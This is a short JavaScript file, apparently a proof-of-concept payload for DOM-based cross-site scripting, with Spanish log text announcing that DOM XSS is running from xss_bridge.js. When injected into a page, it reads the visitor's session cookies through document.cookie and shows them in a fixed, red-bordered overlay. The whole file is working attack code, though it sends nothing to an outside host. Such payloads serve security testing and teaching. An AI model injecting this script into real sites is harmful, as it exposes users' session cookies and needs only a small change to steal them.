console.log("✅ DOM XSS en ejecución desde xss_bridge.js");

let div = document.createElement("div");
div.innerText = "XSS ACTIVO: " + document.cookie;
div.style.position = "fixed";
div.style.top = "10px";
div.style.left = "10px";
div.style.background = "white";
div.style.padding = "5px";
div.style.border = "2px solid red";
div.style.zIndex = 9999;
document.body.appendChild(div);


